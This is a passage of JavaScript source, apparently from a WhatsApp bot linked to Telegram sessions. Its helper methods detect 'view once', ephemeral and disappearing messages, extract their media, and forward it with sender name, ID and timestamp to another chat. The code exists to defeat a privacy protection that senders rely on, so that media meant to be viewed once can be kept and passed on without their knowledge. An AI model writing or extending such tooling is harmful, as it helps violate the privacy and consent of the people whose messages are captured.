        throw new Error(`Unsupported media type: ${mediaType}`)
      }

      await sock.sendMessage(targetJid, payload, { quoted: quotedReference })

      //this.log(`Successfully sent ${mediaType} to ${targetJid}`, "success")
    } catch (error) {
      //this.log(`Error sending ${mediaType} to target: ${error.message}`, "error")

      try {
        await sock.sendMessage(
          targetJid,
          {
            text: `❌ Failed to send ViewOnce ${mediaType}\n\nError: ${error.message}\n\nCaption: ${caption}`,
          },
          { quoted: quotedReference }
        )
      } catch (fallbackError) {
        //this.log(`Fallback text message also failed: ${fallbackError.message}`, "error")
        throw fallbackError
      }
    }
  }

  /**
   * ===========================================
   * HELPER UTILITY METHODS
   * ===========================================
   */
  static hasViewOnceMedia(obj) {
    if (!obj || typeof obj !== "object") return false

    const viewOnceIndicators = [
      "viewOnceMessageV2",
      "viewOnceMessage", 
      "viewOnceMessageV2Extension",
      "ephemeralMessage",
      "disappearingMessage",
    ]

    if (viewOnceIndicators.some((indicator) => obj[indicator])) return true

    const allMediaTypes = [
      "imageMessage",
      "videoMessage",
      "audioMessage", 
      "documentMessage",
      "pttMessage",
      "stickerMessage",
      "contactMessage",
      "locationMessage",
    ]

    return allMediaTypes.some((type) => obj[type]?.viewOnce)
  }

  static extractMediaFromMessage(messageObj) {
    if (!messageObj) return { mediaType: null, mediaMessage: null }

    const mediaTypes = [
      { key: "imageMessage", type: "image" },
      { key: "videoMessage", type: "video" },
      { key: "audioMessage", type: "audio" },
      { key: "documentMessage", type: "document" },
      { key: "pttMessage", type: "audio" },
      { key: "stickerMessage", type: "sticker" },
    ]

    for (const { key, type } of mediaTypes) {
      if (messageObj[key]) {
        return { mediaType: type, mediaMessage: messageObj[key] }
      }
    }

    return { mediaType: null, mediaMessage: null }
  }

  static normalizeMediaKey(mediaKey) {
    if (mediaKey instanceof Uint8Array) return Buffer.from(mediaKey)
    if (Buffer.isBuffer(mediaKey)) return mediaKey
    if (typeof mediaKey === "string") return Buffer.from(mediaKey, "base64")
    throw new Error("Unsupported MediaKey format")
  }

  static getNestedProperty(obj, path) {
    return path.split(".").reduce((current, key) => current?.[key], obj)
  }

  static shouldSkipProperty(key, value) {
    const skipKeys = ["__proto__", "constructor", "prototype", "toString", "valueOf"]
    const skipTypes = ["function", "symbol"]

    return (
      skipKeys.includes(key) ||
      skipTypes.includes(typeof value) ||
      Buffer.isBuffer(value) ||
      (key.startsWith("_") && key.length > 5)
    )
  }

  static getObjectIdentifier(obj) {
    if (obj === null) return "null"
    if (obj === undefined) return "undefined"
    if (Buffer.isBuffer(obj)) return `buffer_${obj.length}`

    try {
      return `${typeof obj}_${JSON.stringify(Object.keys(obj).sort()).substring(0, 50)}`
    } catch {
      return `object_${Math.random().toString(36).substring(7)}`
    }
  }

  static generateCacheKey(message) {
    try {
      const keyData = {
        id: message.key?.id,
        from: message.key?.remoteJid,
        hasViewOnce: Boolean(message.message?.viewOnceMessageV2 || message.message?.viewOnceMessage),
        timestamp: message.messageTimestamp,
      }
      return require("crypto").createHash("md5").update(JSON.stringify(keyData)).digest("hex")
    } catch {
      return Math.random().toString(36).substring(7)
    }
  }

  static createDetailedMetadata(mediaMessage, mediaType, m, detection, processingType) {
    const senderName = m.pushName || "Unknown"
    const timestamp = new Date().toLocaleString()

    const metadata =
      `🚨 VIEWONCE MEDIA DETECTED (${processingType}) 🚨\n\n` +
      `👤 Sender: ${senderName}\n` +
      `📱 Type: ${mediaType.toUpperCase()}\n` +
      `🔍 Detection: ${detection.type}\n` +
      `📝 Caption: ${mediaMessage?.caption || "[No Caption]"}\n` +
      `📏 Size: ${mediaMessage?.fileLength || 0} bytes\n` +
      `🔗 MIME: ${mediaMessage?.mimetype || "Unknown"}\n` +
      `🕒 Time: ${timestamp}\n` +
      `📱 ID: ${m.key.id}\n\n` +
      `⚠️ Media content could not be recovered\n` +
      `🔄 Tried ${this.MAX_RETRIES} download methods\n` +
      `💡 This is a detection record`

    return Buffer.from(metadata, "utf8")
  }

  static getMimetypeForMediaType(mediaType) {
    const mimetypes = {
      image: "image/jpeg",
      video: "video/mp4", 
      audio: "audio/mp4",
      document: "application/octet-stream",
      sticker: "image/webp",
    }

    return mimetypes[mediaType] || "application/octet-stream"
  }

  static isViewOnceKey(key) {
    const viewOnceKeys = [
      "viewonce",
      "viewOnce",
      "viewOnceMessage",
      "viewOnceMessageV2",
      "ephemeral",
      "disappearing",
      "expire",
      "once", 
      "single",
    ]

    const keyLower = key.toLowerCase()
    return viewOnceKeys.some((indicator) => keyLower.includes(indicator))
  }

  static checkViewOnceProperty(value, key) {
    if (!value || typeof value !== "object") {
      return { detected: false }
    }

    if (this.hasViewOnceMedia(value)) {
      const { mediaType, mediaMessage } = this.extractMediaFromMessage(value)
      if (mediaType && mediaMessage) {
        return {
          detected: true,
          type: "force_deep_scan",
          mediaType,
          mediaMessage,
          source: value,
          foundAt: key,
        }
      }
    }

    return { detected: false }
  }

  static checkNestedViewOnce(obj, type) {
    if (!obj || typeof obj !== "object") {
      return { detected: false }
    }

    if (this.hasViewOnceMedia(obj)) {
      const { mediaType, mediaMessage } = this.extractMediaFromMessage(obj)
      if (mediaType && mediaMessage) {
        return {
          detected: true,
          type: `nested_${type}`,
          mediaType,
          mediaMessage,
          content: obj,
        }
      }
    }

    return { detected: false }
  }

  static delay(ms) {
    return new Promise((resolve) => setTimeout(resolve, ms))
  }

  static log(message, type = "info") {
    if (!this.DEBUG_MODE && type === "debug") return

    const colors = {
      success: "\x1b[32m", // Green
      warning: "\x1b[33m", // Yellow  
      error: "\x1b[31m", // Red
      info: "\x1b[34m", // Blue
      debug: "\x1b[90m", // Gray
    }

    const reset = "\x1b[0m"
    const color = colors[type] || ""
    const timestamp = new Date().toISOString().split("T")[1].split(".")[0]

   // console.log(`${color}[ViewOnce][${timestamp}] ${message}${reset}`)
  }

  /**
   * ===========================================
   * MESSAGE CONTEXT EXTRACTION
   * ===========================================
   * 
   * Extracts telegram_id and session context from message
   */
  static async getMessageContext(m) {
    try {
      if (m.sessionContext && m.sessionContext.telegram_id) {
        return { telegram_id: m.sessionContext.telegram_id }
      }

      // Fallback: try to get from telegramContext if available
      if (m.telegramContext && m.telegramContext.telegram_id) {
        return { telegram_id: m.telegramContext.telegram_id }
      }

      // Last resort: extract from session ID if available
      if (m.sessionId) {
        const sessionIdMatch = m.sessionId.match(/session_(\d+)/)
        if (sessionIdMatch) {
          return { telegram_id: Number.parseInt(sessionIdMatch[1]) }
        }
      }

      return null
    } catch (error) {
      //this.log(`Error getting message context: ${error.message}`, "error")
      return null
    }
  }
}
